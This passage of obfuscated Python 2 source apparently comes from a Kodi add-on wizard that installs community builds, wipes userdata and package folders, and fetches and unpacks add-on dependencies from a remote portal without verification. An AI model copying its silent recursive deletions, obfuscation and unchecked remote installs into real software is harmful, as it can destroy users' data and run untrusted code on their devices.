  if 20 - 20: OoOoOO00 * oo0oooooO0
 if ooO0 != I1i1I :
  if 19 - 19: OoooooooOO
  if 76 - 76: OoO0O00 * ooOo
  if 63 - 63: II111iiii . II111iiii + I1ii11iIi11i + Oo + O0 . OO0oo0oOO
  if 1 - 1: O0 * i11iIiiIii - OOo00O0 - OO0oo0oOO
  i1iIIIi1i ( '[COLOR=dodgerblue]1. Install:[/COLOR] Overwrite My Current Setup & Install New Build' , oO0o , 'restore_community' , i1oOOOOOOOoO , I1 , 'merge' , ooO , IiI1ii11I1 , ii111iiIii , o0OO0oooo )
  i1iIIIi1i ( '[COLOR=dodgerblue]2. Install:[/COLOR] Keep My Library & Profiles' , oO0o , 'restore_community' , i1oOOOOOOOoO , I1 , 'libprofile' , ooO , IiI1ii11I1 , ii111iiIii , o0OO0oooo )
  i1iIIIi1i ( '[COLOR=dodgerblue]3. Install:[/COLOR] Keep My Library Only' , oO0o , 'restore_community' , i1oOOOOOOOoO , I1 , 'library' , ooO , IiI1ii11I1 , ii111iiIii , o0OO0oooo )
  i1iIIIi1i ( '[COLOR=dodgerblue]4. Install:[/COLOR] Keep My Profiles Only' , oO0o , 'restore_community' , i1oOOOOOOOoO , I1 , 'profiles' , ooO , IiI1ii11I1 , ii111iiIii , o0OO0oooo )
  if 94 - 94: OoO0O00 + oOoO0o00OO0 + OOo00O0
 if ii111iiIii != 'None' :
  iIiIIi1 ( '' , '[COLOR=orange]---------- (OPTIONAL) Guisettings Fix ----------[/COLOR]' , 'None' , '' , 'noobsandnerds.png' , '' , '' , '' )
  iIiIIi1 ( '' , '[COLOR=orange]Install Step 2:[/COLOR] Apply guisettings.xml fix' , ii111iiIii , 'guisettingsfix' , 'Fix_My_Build.png' , I1 , '' , '' )
  if 82 - 82: Oo0Ooo - Oo0Ooo . iIii1I11I1II1 / Oo + oOoO0o00OO0 % iIii1I11I1II1
  if 61 - 61: Oo / Oo0Ooo % Oo - OoO0O00 + OOo00O0 / OOo00O0
  if 82 - 82: Oo0Ooo
  if 5 - 5: OoO0O00 / OoO0O00 - O0 - iI1iiIiiII + iI1iiIiiII
  if 99 - 99: iii1I11ii1i1 * OoooooooOO / o0oOOo0O0Ooo . oOoO0o00OO0 - iIii1I11I1II1 - OO0oo0oOO
  if 31 - 31: oOoO0o00OO0 - OoO0O00 / Oo . i1IIi / OO0oo0oOO
  if 66 - 66: OoO0O00
  if 72 - 72: iI1iiIiiII
  if 91 - 91: II111iiii / oOoO0o00OO0 + iIii1I11I1II1 . iii1I11ii1i1 - O0
def O0OOO00OOO00o ( ) :
 print '############################################################       DELETING USERDATA             ###############################################################'
 i11o00Ooo = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 if 54 - 54: I1IiiI * Oo + o0oOOo0O0Ooo % i1IIi - o0oOOo0O0Ooo + OoOoOO00
 for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( i11o00Ooo ) :
  O0O0O0o = 0
  O0O0O0o += len ( ooO0oo )
  if 83 - 83: oo0oooooO0 % iii1I11ii1i1
  if O0O0O0o >= 0 :
   if 6 - 6: OoOoOO00 / OOo00O0 + oo0oooooO0 - o0oOOo0O0Ooo * Oo + OOo00O0
   for ooOo0O0o0 in ooO0oo :
    os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    if 76 - 76: II111iiii - OoooooooOO % oOoO0o00OO0
   for ii1iIIiii1 in iIIIIiiIii :
    shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
    if 40 - 40: OO0oo0oOO
    if 59 - 59: iii1I11ii1i1 * OoooooooOO + Oo . iIii1I11I1II1 / i1IIi
def O0Oo0O00o0oo0OO ( ) :
 for OooO00 in glob . glob ( os . path . join ( o00OO00OoO , 'xbmc_crashlog*.*' ) ) :
  o0O00OoOOo = OooO00
  os . remove ( OooO00 )
  O0OoO000O0OO = xbmcgui . Dialog ( )
  O0OoO000O0OO . ok ( "Crash Logs Deleted" , "Your old crash logs have now been deleted." )
  if 9 - 9: o0oOOo0O0Ooo % I1ii11iIi11i . I1ii11iIi11i
  if 28 - 28: OoooooooOO % ooOo + I1ii11iIi11i + O0 . iI1iiIiiII
def ooOO0OOO00o ( ) :
 print '############################################################       DELETING PACKAGES             ###############################################################'
 OoOoO0ooooO0 = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 if 4 - 4: Oo0Ooo - OoO0O00 - i11iIiiIii * iI1iiIiiII / OO0oo0oOO - Oo
 for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( OoOoO0ooooO0 ) :
  O0O0O0o = 0
  O0O0O0o += len ( ooO0oo )
  if 45 - 45: o0oOOo0O0Ooo % Oo0Ooo * i1IIi - O0
  if O0O0O0o > 0 :
   if 82 - 82: II111iiii / oo0oooooO0
   for ooOo0O0o0 in ooO0oo :
    os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    if 96 - 96: Oo0Ooo / ooOo . II111iiii . Oo0Ooo
   for ii1iIIiii1 in iIIIIiiIii :
    shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
    if 91 - 91: II111iiii . Oo + o0oOOo0O0Ooo
    if 8 - 8: Oo * Oo0Ooo / oo0oooooO0 - OoO0O00 - OoooooooOO
def oOiIi ( ) :
 print '############################################################       DELETING USERDATA             ###############################################################'
 i11o00Ooo = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 if 65 - 65: II111iiii + i1IIi * i11iIiiIii
 for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( i11o00Ooo ) :
  O0O0O0o = 0
  O0O0O0o += len ( ooO0oo )
  if 38 - 38: iIii1I11I1II1 + OoooooooOO * I1IiiI % OoOoOO00 % iii1I11ii1i1 - oOoO0o00OO0
  if O0O0O0o >= 0 :
   if 56 - 56: OoooooooOO * Oo0Ooo * iii1I11ii1i1 + OOo00O0
   for ooOo0O0o0 in ooO0oo :
    os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    if 54 - 54: OoOoOO00 * i11iIiiIii . OoooooooOO - iIii1I11I1II1
   for ii1iIIiii1 in iIIIIiiIii :
    shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
    if 38 - 38: iii1I11ii1i1 . iii1I11ii1i1 * ooOo / OoooooooOO % OOo00O0
    if 80 - 80: OoO0O00 / oOoO0o00OO0 * I1IiiI % oOoO0o00OO0
def I1iii ( name , addon_id ) :
 iIiI1I1Ii = 1
 O0OO0oOoO0O0O = 1
 ooo00 = xbmc . translatePath ( os . path . join ( Ooo , addon_id , 'addon.xml' ) )
 iII11II1II = open ( ooo00 , mode = 'r' )
 OOO00000o0 = iII11II1II . read ( )
 iII11II1II . close ( )
 OOOO000Ooo0O = re . compile ( 'import addon="(.+?)"' ) . findall ( OOO00000o0 )
 if 96 - 96: Oo0Ooo + iI1iiIiiII . i1IIi
 for ii1i in OOOO000Ooo0O :
  if 54 - 54: II111iiii . i1IIi / I1ii11iIi11i % I1IiiI / iI1iiIiiII
  if not 'xbmc.python' in ii1i :
   print 'Script Requires --- ' + ii1i
   OO = xbmc . translatePath ( os . path . join ( Ooo , ii1i ) )
   if 62 - 62: ooOo + Oo0Ooo / i11iIiiIii
   if not os . path . exists ( OO ) :
    iIII1I111III = 'http://noobsandnerds.com/TI/AddonPortal/dependencyinstall.php?id=%s' % ( ii1i )
    IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    I1i1i1iii = re . compile ( 'name="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
    ii1iii1i = re . compile ( 'version="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
    o0oooOO00 = re . compile ( 'repo_url="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
    iiIiii1IIIII = re . compile ( 'data_url="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
    o00o = re . compile ( 'zip_url="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
    oo00o0 = re . compile ( 'repo_id="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
    ooOoOo = I1i1i1iii [ 0 ] if ( len ( I1i1i1iii ) > 0 ) else ''
    Oo0 = ii1iii1i [ 0 ] if ( len ( ii1iii1i ) > 0 ) else ''
    iIi = o0oooOO00 [ 0 ] if ( len ( o0oooOO00 ) > 0 ) else ''
    ii1iI1i = iiIiii1IIIII [ 0 ] if ( len ( iiIiii1IIIII ) > 0 ) else ''
    i1iiiI = o00o [ 0 ] if ( len ( o00o ) > 0 ) else ''
    OoOoO00o00 = oo00o0 [ 0 ] if ( len ( oo00o0 ) > 0 ) else ''
    OOooooO0o0O0 = xbmc . translatePath ( os . path . join ( OOO00O , ooOoOo + '.zip' ) )
    if 74 - 74: OoOoOO00 / i1IIi % OoooooooOO
    try :
     downloader . download ( iIi , OOooooO0o0O0 , iiI1IiI )
     O0OoOoO00O ( OOooooO0o0O0 , Ooo , iiI1IiI )
     if 52 - 52: oOoO0o00OO0 % OOo00O0
    except :
     if 25 - 25: iii1I11ii1i1 / iii1I11ii1i1 % OoooooooOO - I1ii11iIi11i * ooOo
     try :
      downloader . download ( i1iiiI , OOooooO0o0O0 , iiI1IiI )
      O0OoOoO00O ( OOooooO0o0O0 , Ooo , iiI1IiI )
      if 23 - 23: i11iIiiIii
     except :
      if 100 - 100: ooOo + O0 . I1IiiI + i1IIi - OoOoOO00 + o0oOOo0O0Ooo
      try :
       if 65 - 65: II111iiii / Oo0Ooo
       if not os . path . exists ( OO ) :
        os . makedirs ( OO )
        if 42 - 42: i11iIiiIii . O0
       IIo0o0O0O00oOOo = iIIIiIi ( ii1iI1i ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
       i11111I1IOoo0ooOOOOoOo = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
       if 75 - 75: iI1iiIiiII + iIii1I11I1II1
       for IiiiI in i11111I1IOoo0ooOOOOoOo :
        Iiii1I1 = xbmc . translatePath ( os . path . join ( OO , IiiiI ) )
        if 19 - 19: I1IiiI + i11iIiiIii . oOoO0o00OO0 - iii1I11ii1i1 / OO0oo0oOO + o0oOOo0O0Ooo
        if addon_id not in IiiiI and '/' not in IiiiI :
         if 38 - 38: Oo0Ooo / iIii1I11I1II1 * iIii1I11I1II1 % I1ii11iIi11i
         try :
          iiI1IiI . update ( 0 , "Downloading [COLOR=yellow]" + IiiiI + '[/COLOR]' , '' , 'Please wait...' )
          downloader . download ( ii1iI1i + IiiiI , Iiii1I1 , iiI1IiI )
          if 92 - 92: iii1I11ii1i1 / O0 * I1IiiI - iii1I11ii1i1
         except :
          print "failed to install" + IiiiI
          if 99 - 99: i11iIiiIii % OoooooooOO
        if '/' in IiiiI and '..' not in IiiiI and 'http' not in IiiiI :
         O0O00oOooo0OO = ii1iI1i + IiiiI
         iIIi1I ( Iiii1I1 , O0O00oOooo0OO )
         if 56 - 56: oOoO0o00OO0 * iI1iiIiiII
      except :
       O0OoO000O0OO . ok ( "Error downloading dependency" , 'There was an error downloading [COLOR=dodgerblue]' + ooOoOo + '[/COLOR]. Please consider updating the add-on portal with details or report the error on the forum at [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR]' )
       O0OO0oOoO0O0O = 0
       iIiI1I1Ii = 0
       if 98 - 98: iii1I11ii1i1 + O0 * iI1iiIiiII + i11iIiiIii - Oo - iIii1I11I1II1
    if O0OO0oOoO0O0O == 1 :
     time . sleep ( 1 )
     iiI1IiI . update ( 0 , "[COLOR=yellow]" + ooOoOo + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Please wait...' )
     time . sleep ( 1 )
     iiii1I1 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( ii1i )
     iIIIiIi ( iiii1I1 )
 iiI1IiI . close ( )
 time . sleep ( 1 )
 if 5 - 5: Oo % Oo0Ooo % oOoO0o00OO0 % OOo00O0
 if 17 - 17: OO0oo0oOO + II111iiii + OoooooooOO / Oo / oOoO0o00OO0
def oOoo0Ooooo ( name , url , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 Ii1Ii1IiIIIi1 ( buildname + '     v.' + version , '[COLOR=yellow][B]Author:   [/B][/COLOR]' + author + '[COLOR=yellow][B]               Last Updated:   [/B][/COLOR]' + updated + '[COLOR=yellow][B]               Adult Content:   [/B][/COLOR]' + adult + '[CR][CR][COLOR=yellow][B]Description:[CR][/B][/COLOR]' + description +
 '[CR][CR][COLOR=blue][B]Skins:   [/B][/COLOR]' + skins + '[CR][CR][COLOR=blue][B]Video Addons:   [/B][/COLOR]' + videoaddons + '[CR][CR][COLOR=blue][B]Audio Addons:   [/B][/COLOR]' + audioaddons +
 '[CR][CR][COLOR=blue][B]Program Addons:   [/B][/COLOR]' + programaddons + '[CR][CR][COLOR=blue][B]Picture Addons:   [/B][/COLOR]' + pictureaddons + '[CR][CR][COLOR=blue][B]Sources:   [/B][/COLOR]' + sources +
 '[CR][CR][COLOR=orange]Disclaimer: [/COLOR]These are community builds and they may overwrite some of your existing settings, '
 'It\'s purely the responsibility of the user to choose whether or not they wish to install these builds, the individual who uploads the build should state what\'s included and then it\'s the users decision to decide whether or not that content is suitable for them.' )
 if 55 - 55: ooOo + O0 / oo0oooooO0 % OOo00O0 / OoooooooOO
 if 98 - 98: OO0oo0oOO * iIii1I11I1II1 % Oo0Ooo % Oo
def O0ooO00o ( path ) :
 iiI1IiI . create ( "[COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR]" , "Wiping..." , '' , 'Please Wait' )
 shutil . rmtree ( path , ignore_errors = True )
 if 24 - 24: iI1iiIiiII + OoooooooOO . oOoO0o00OO0 / OoOoOO00 / iii1I11ii1i1
 if 65 - 65: OoooooooOO
def O0OoOoO00O ( _in , _out , dp = None ) :
 if dp :
  return iiii11iI1 ( _in , _out , dp )
  if 81 - 81: i11iIiiIii + OO0oo0oOO % i11iIiiIii - i1IIi
 return ii11i1I1i ( _in , _out )
 if 49 - 49: OoooooooOO + OoooooooOO / Oo . ooOo
 if 13 - 13: II111iiii . oo0oooooO0 - iI1iiIiiII . OoO0O00 . iIii1I11I1II1
def ii11i1I1i ( _in , _out ) :
 try :
  oO00oooo0OOo = zipfile . ZipFile ( _in , 'r' )
  oO00oooo0OOo . extractall ( _out )
  if 93 - 93: ooOo * o0oOOo0O0Ooo / Oo - Oo . oo0oooooO0 / I1IiiI
 except Exception , I111ii1iI :
  print str ( I111ii1iI )
  return False
  if 33 - 33: OO0oo0oOO % O0 + I1ii11iIi11i
 return True
 if 96 - 96: OOo00O0 . OoooooooOO
 if 39 - 39: Oo + OoO0O00
def iiii11iI1 ( _in , _out , dp ) :
 oO00oooo0OOo = zipfile . ZipFile ( _in , 'r' )
 oOoOOOO0OOO = float ( len ( oO00oooo0OOo . infolist ( ) ) )
 O0oo0oO00o = 0
 if 35 - 35: oo0oooooO0 * iIii1I11I1II1 / OOo00O0 * i1IIi * O0 % iIii1I11I1II1
 try :
  if 97 - 97: i11iIiiIii + Oo0Ooo * Oo % oo0oooooO0 . oOoO0o00OO0
  for iiOo0 in oO00oooo0OOo . infolist ( ) :
   O0oo0oO00o += 1
   OOO00 = O0oo0oO00o / oOoOOOO0OOO * 100
   dp . update ( int ( OOO00 ) )
   oO00oooo0OOo . extract ( iiOo0 , _out )
   if 29 - 29: oOoO0o00OO0
 except Exception , I111ii1iI :
  print str ( I111ii1iI )
  return False
  if 4 - 4: i11iIiiIii - Oo % I1ii11iIi11i * iI1iiIiiII % o0oOOo0O0Ooo
 return True
 if 71 - 71: OOo00O0 . OOo00O0 - iIii1I11I1II1
def I1I1i ( ) :
 os . remove ( Ooo0OO0oOO )
 os . rename ( oo0OooOOo0 , Ooo0OO0oOO )
 xbmc . executebuiltin ( 'UnloadSkin' )
 xbmc . executebuiltin ( "ReloadSkin" )
 O0OoO000O0OO . ok ( "Local Restore Complete" , 'XBMC/Kodi will now close.' , '' , '' )
 xbmc . executebuiltin ( "Quit" )
 if 22 - 22: OoooooooOO / I1ii11iIi11i % oo0oooooO0 * OoOoOO00
 if 32 - 32: OoooooooOO % ooOo % iIii1I11I1II1 / O0
def Iiii1 ( url ) :
 iiI1IiI . create ( "Changing Physical Paths To Special" , "Renaming paths..." , '' , 'Please Wait' )
 if 61 - 61: II111iiii . O0 - OO0oo0oOO - I1ii11iIi11i / i11iIiiIii - II111iiii
 for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( url ) :
  if 98 - 98: OO0oo0oOO - I1IiiI . i11iIiiIii * Oo0Ooo
  for file in ooO0oo :
   if 29 - 29: OO0oo0oOO / OOo00O0 % iii1I11ii1i1
   if file . endswith ( ".xml" ) :
    iiI1IiI . update ( 0 , "Fixing" , file , 'Please Wait' )
    ooo0O0o0OoOO = open ( ( os . path . join ( IIIIiI11Ii1i , file ) ) ) . read ( )
    ii1iIII1ii = ooo0O0o0OoOO . replace ( II , 'special://home/' )
    ooOo0O0o0 = open ( ( os . path . join ( IIIIiI11Ii1i , file ) ) , mode = 'w' )
    ooOo0O0o0 . write ( str ( ii1iIII1ii ) )
    ooOo0O0o0 . close ( )
    if 47 - 47: iii1I11ii1i1 . oo0oooooO0 * OO0oo0oOO - OOo00O0 . iii1I11ii1i1 - Oo
    if 94 - 94: I1IiiI % oOoO0o00OO0 + OoO0O00
def OoOooO ( ) :
 I1IOoo = 'http://noobsandnerds.com/TI/AddonPortal/Addon_Fix/addonfix.txt'
 IIo0o0O0O00oOOo = iIIIiIi ( I1IOoo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 if 94 - 94: II111iiii
 for ooO , i1iI , i1oOOOOOOOoO , I1 , i1i1IIii1i1 in i11111I1IOoo0ooOOOOoOo :
  iIiIIi1 ( '' , ooO , i1iI , 'OSS' , i1oOOOOOOOoO , I1 , '' , i1i1IIii1i1 )
  if 26 - 26: iIii1I11I1II1 - I1ii11iIi11i . oOoO0o00OO0 . oOoO0o00OO0 + iIii1I11I1II1 * Oo0Ooo
  if 85 - 85: Oo + II111iiii - Oo * ooOo - i1IIi % oo0oooooO0
def IiIiI ( ) :
 O00oo = [ ]
 OoOoooO000OO = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
 i11i11 = "Creating full backup of existing build"
 i11IiI1iiI11 = "Creating Community Build"
 Ii11Iii = "Archiving..."
 ooo00OoOO0o = ""
 oo0O0o = "Please Wait"
 if 47 - 47: OoOoOO00
 iIIi1iI1I1IIi ( II , myfullbackup , i11i11 , Ii11Iii , ooo00OoOO0o , oo0O0o , O00oo , OoOoooO000OO )
 if 65 - 65: O0 + iI1iiIiiII % OO0oo0oOO * I1IiiI / OOo00O0 / OoOoOO00
 if 71 - 71: i11iIiiIii / OoOoOO00 . ooOo
def iI1IIIi11 ( url ) :
 iIiIIi1 ( 'folder' , 'Anime' , str ( url ) + '&genre=anime' , 'grab_builds' , 'anime.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Audiobooks' , str ( url ) + '&genre=audiobooks' , 'grab_builds' , 'audiobooks.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Comedy' , str ( url ) + '&genre=comedy' , 'grab_builds' , 'comedy.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Comics' , str ( url ) + '&genre=comics' , 'grab_builds' , 'comics.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Documentary' , str ( url ) + '&genre=documentary' , 'grab_builds' , 'documentary.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Downloads' , str ( url ) + '&genre=downloads' , 'grab_builds' , 'downloads.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Food' , str ( url ) + '&genre=food' , 'grab_builds' , 'food.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Gaming' , str ( url ) + '&genre=gaming' , 'grab_builds' , 'gaming.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Health' , str ( url ) + '&genre=health' , 'grab_builds' , 'health.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'How To...' , str ( url ) + '&genre=howto' , 'grab_builds' , 'howto.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Kids' , str ( url ) + '&genre=kids' , 'grab_builds' , 'kids.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Live TV' , str ( url ) + '&genre=livetv' , 'grab_builds' , 'livetv.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Movies' , str ( url ) + '&genre=movies' , 'grab_builds' , 'movies.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Music' , str ( url ) + '&genre=music' , 'grab_builds' , 'music.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'News' , str ( url ) + '&genre=news' , 'grab_builds' , 'news.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Photos' , str ( url ) + '&genre=photos' , 'grab_builds' , 'photos.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Podcasts' , str ( url ) + '&genre=podcasts' , 'grab_builds' , 'podcasts.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Radio' , str ( url ) + '&genre=radio' , 'grab_builds' , 'radio.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Religion' , str ( url ) + '&genre=religion' , 'grab_builds' , 'religion.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Space' , str ( url ) + '&genre=space' , 'grab_builds' , 'space.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Sports' , str ( url ) + '&genre=sports' , 'grab_builds' , 'sports.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Technology' , str ( url ) + '&genre=tech' , 'grab_builds' , 'tech.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Trailers' , str ( url ) + '&genre=trailers' , 'grab_builds' , 'trailers.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'TV Shows' , str ( url ) + '&genre=tv' , 'grab_builds' , 'tv.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Misc.' , str ( url ) + '&genre=other' , 'grab_builds' , 'other.png' , '' , '' , '' )
 if 69 - 69: O0 - O0
 if o0O . getSetting ( 'adult' ) == 'true' :
  iIiIIi1 ( 'folder' , 'XXX' , str ( url ) + '&genre=adult' , 'grab_builds' , 'adult.png' , '' , '' , '' )
  if 41 - 41: oOoO0o00OO0 % o0oOOo0O0Ooo
def Ooooo ( default = "" , heading = "" , hidden = False ) :
 oo0O0oOOO0o = xbmc . Keyboard ( default , heading , hidden )
 if 70 - 70: Oo0Ooo % OO0oo0oOO . I1ii11iIi11i
 oo0O0oOOO0o . doModal ( )
 if ( oo0O0oOOO0o . isConfirmed ( ) ) :
  return unicode ( oo0O0oOOO0o . getText ( ) , "utf-8" )
 return default
 if 8 - 8: I1IiiI - iI1iiIiiII * iii1I11ii1i1 % OoooooooOO / OoOoOO00
 if 15 - 15: OOo00O0 . o0oOOo0O0Ooo + OoOoOO00 . iIii1I11I1II1 % OOo00O0 + O0
def IIiII11 ( ) :
 oo0O00OOOOO = [ ]
 OoOII11IiI1 = sys . argv [ 2 ]
 if len ( OoOII11IiI1 ) >= 2 :
  OoOOOO00oOO = sys . argv [ 2 ]
  iiIIiIi = OoOOOO00oOO . replace ( '?' , '' )
  if ( OoOOOO00oOO [ len ( OoOOOO00oOO ) - 1 ] == '/' ) :
   OoOOOO00oOO = OoOOOO00oOO [ 0 : len ( OoOOOO00oOO ) - 2 ]
  O000oO = iiIIiIi . split ( '&' )
  oo0O00OOOOO = { }
  for ii11Ii1IiiI1 in range ( len ( O000oO ) ) :
   O00o0o = { }
   O00o0o = O000oO [ ii11Ii1IiiI1 ] . split ( '=' )
   if ( len ( O00o0o ) ) == 2 :
    oo0O00OOOOO [ O00o0o [ 0 ] ] = O00o0o [ 1 ]
    if 65 - 65: I1ii11iIi11i % ooOo . OoooooooOO * o0oOOo0O0Ooo * OoO0O00
 return oo0O00OOOOO
 if 10 - 10: ooOo - oo0oooooO0 % II111iiii - iI1iiIiiII - i1IIi
def iIi11iI1i ( ) :
 iI1i1IiIIIIi = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 iiI1IiI = xbmcgui . DialogProgress ( )
 iiI1IiI . create ( "Gotham Addon Fix" , "Please wait whilst your addons" , '' , 'are being made Gotham compatible.' )
 if 46 - 46: i1IIi + II111iiii * i1IIi - OO0oo0oOO
 for OooO00 in glob . glob ( os . path . join ( iI1i1IiIIIIi , '*.*' ) ) :
  if 79 - 79: II111iiii - ooOo * I1ii11iIi11i - OoOoOO00 . I1ii11iIi11i
  for file in glob . glob ( os . path . join ( OooO00 , '*.*' ) ) :
   if 11 - 11: O0 * OoOoOO00
   if 'addon.xml' in file :
    iiI1IiI . update ( 0 , "Fixing" , file , 'Please Wait' )
    ooo0O0o0OoOO = open ( file ) . read ( )
    ii1iIII1ii = ooo0O0o0OoOO . replace ( 'addon="xbmc.python" version="1.0"' , 'addon="xbmc.python" version="2.1.0"' ) . replace ( 'addon="xbmc.python" version="2.0"' , 'addon="xbmc.python" version="2.1.0"' )
    ooOo0O0o0 = open ( file , mode = 'w' )
    ooOo0O0o0 . write ( str ( ii1iIII1ii ) )
    ooOo0O0o0 . close ( )
    if 37 - 37: OoOoOO00 + O0 . O0 * Oo0Ooo % iI1iiIiiII / oo0oooooO0
 O0OoO000O0OO = xbmcgui . Dialog ( )
 O0OoO000O0OO . ok ( "Your addons have now been made compatible" , "If you still find you have addons that aren't working please run the addon so it throws up a script error, upload a log and post details on the relevant support forum." )
 if 18 - 18: OoooooooOO
 if 57 - 57: OOo00O0 . OoOoOO00 * o0oOOo0O0Ooo - OoooooooOO
def OooO ( ) :
 O0OoO000O0OO = xbmcgui . Dialog ( )
 IiiIiI1IIi1IIIii = xbmcgui . Dialog ( ) . yesno ( 'Convert Addons To Gotham' , 'This will edit your addon.xml files so they show as Gotham compatible. It\'s doubtful this will have any effect on whether or not they work but it will get rid of the annoying incompatible pop-up message. Do you wish to continue?' )
 if 69 - 69: Oo0Ooo / OO0oo0oOO - OO0oo0oOO / OoOoOO00 * OoO0O00 * iii1I11ii1i1
 if IiiIiI1IIi1IIIii == 1 :
  iIi11iI1i ( )
  if 82 - 82: OoO0O00 - Oo0Ooo - O0 - OoooooooOO
  if 4 - 4: II111iiii - ooOo % Oo0Ooo * i11iIiiIii
def iIiII1iiiiI ( url ) :
 global oooooOoo0ooo
 if 80 - 80: Oo0Ooo - o0oOOo0O0Ooo - II111iiii . oOoO0o00OO0 - O0 * oOoO0o00OO0
 if o0O . getSetting ( 'adult' ) == 'true' :
  iI1 = 'yes'
  if 43 - 43: I1IiiI / oo0oooooO0 / OOo00O0 + iIii1I11I1II1 + OoooooooOO
 else :
  iI1 = 'no'
  if 33 - 33: II111iiii - oOoO0o00OO0 - OOo00O0
 oO00oOoo00o0 = 'http://noobsandnerds.com/TI/AddonPortal/sortby_new.php?sortx=name&user=%s&adult=%s&%s' % ( oo00 , iI1 , url )
 IIo0o0O0O00oOOo = iIIIiIi ( oO00oOoo00o0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 41 - 41: ooOo / Oo + oo0oooooO0 + OOo00O0
 i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)"  <br> downloads="(.+?)"  <br> icon="(.+?)"  <br> broken="(.+?)"  <br> UID="(.+?)"  <br>' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
 if i11111I1IOoo0ooOOOOoOo == [ ] :
  if 13 - 13: i11iIiiIii - i11iIiiIii . iIii1I11I1II1
  i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)" <br> downloads="(.+?)" <br> icon="(.+?)" <br> broken="(.+?)" <br> UID="(.+?)" <br>' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
 print i11111I1IOoo0ooOOOOoOo
 if 33 - 33: OoooooooOO + iI1iiIiiII / iI1iiIiiII + iI1iiIiiII * oOoO0o00OO0
 if i11111I1IOoo0ooOOOOoOo != [ ] :
  I1i ( oO00oOoo00o0 , 'addons' )
  if 33 - 33: II111iiii % iIii1I11I1II1 / iIii1I11I1II1 + oOoO0o00OO0
  for ooO , I1i11111i1i11 , iII1111III1I , III1ii1I , OOOoOOO0o0ooo in i11111I1IOoo0ooOOOOoOo :
   if 9 - 9: Oo * i1IIi % OOo00O0 . O0
   if III1ii1I == '0' :
    iIiIIi1 ( 'folder2' , ooO + '[COLOR=lime] [' + I1i11111i1i11 + ' downloads][/COLOR]' , OOOoOOO0o0ooo , 'addon_final_menu' , iII1111III1I , '' , '' )
    if 2 - 2: OoooooooOO % iIii1I11I1II1
   if III1ii1I == '1' :
    iIiIIi1 ( 'folder2' , '[COLOR=red]' + ooO + ' [REPORTED AS BROKEN][/COLOR]' , OOOoOOO0o0ooo , 'addon_final_menu' , iII1111III1I , '' , '' )
    if 21 - 21: oOoO0o00OO0 - I1IiiI % OoooooooOO + o0oOOo0O0Ooo
 elif '&redirect' in url :
